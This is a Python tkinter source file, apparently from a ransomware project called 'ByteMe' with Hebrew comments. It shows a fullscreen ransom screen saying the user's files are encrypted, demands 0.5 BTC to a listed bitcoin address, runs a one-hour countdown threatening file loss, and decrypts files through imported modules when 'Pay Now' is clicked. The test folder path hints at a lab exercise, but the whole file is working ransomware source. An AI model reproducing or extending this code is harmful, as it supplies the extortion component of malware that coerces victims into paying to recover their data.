import tkinter as tk
from tkinter import PhotoImage
import time
import threading
from byte_me.decrypt import decrypt_files
from byte_me.utils import decrypt_key_rsa
import os
TIMER_DURATION = 60 * 60  # 1 hour

target_folder = os.path.expanduser("~/Desktop/TestEncrypt")

DECRYPT_PASSPHRASE = "decrypt"  # מה שהמשתמש צריך להקליד כדי לפענח

time_left = TIMER_DURATION
message_label = None
timer_label = None

def start_decryption():
    global root
    try:
        aes_key = decrypt_key_rsa()
        decrypt_files(aes_key, folder=target_folder)
        message_label.config(text="Payment received. Files are being decrypted.", fg="green")
        root.after(20000, root.destroy)  # זמן קטן לקרוא את ההודעה
        root.destroy()  # סוגר את חלון הכופר
    except Exception as e:
        message_label.config(text=f"Error: {str(e)}", fg="red")
def update_timer():
    global time_left
    while time_left > 0:
        mins, secs = divmod(time_left, 60)
        timer_label.config(text=f"Time left: {mins:02d}:{secs:02d}")
        time.sleep(1)
        time_left -= 1
    timer_label.config(text="Time expired! Files lost.", fg="red")

def show_ransom_note():
    global message_label, timer_label
    global root

    root = tk.Tk()
    root.title("ByteMe Ransomware")
    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    root.bind("<Control-q>", lambda event: root.destroy())

    try:
        img = PhotoImage(file="resources/hacker_fixed.png")  # שים שם את הקובץ
        img_label = tk.Label(root, image=img, bg="black")
        img_label.pack(pady=20)
    except Exception:
        pass  # אם אין תמונה זה עדיין יעבוד

    title = tk.Label(root, text="All your files have been encrypted!", fg="red", bg="black", font=("Arial", 30, "bold"))
    title.pack(pady=10)

    instruction = tk.Label(root, text="To recover your files, send 0.5 BTC to the address below:", fg="white", bg="black", font=("Arial", 18))
    instruction.pack(pady=5)

    btc = tk.Label(root, text="1FfmbHfnpaZjKFvyi1okTjJJusN455paPH", fg="yellow", bg="black", font=("Arial", 22, "bold"))
    btc.pack(pady=10)

    message_label = tk.Label(root, text="After payment, click the button below.", fg="white", bg="black", font=("Arial", 16))
    message_label.pack(pady=5)

    pay_button = tk.Button(root, text="Pay Now", command=start_decryption, fg="white", bg="red", font=("Arial", 18, "bold"))
    pay_button.pack(pady=20)

    timer_label = tk.Label(root, text="", fg="white", bg="black", font=("Arial", 18))
    timer_label.pack(pady=10)

    threading.Thread(target=update_timer, daemon=True).start()
    root.mainloop()

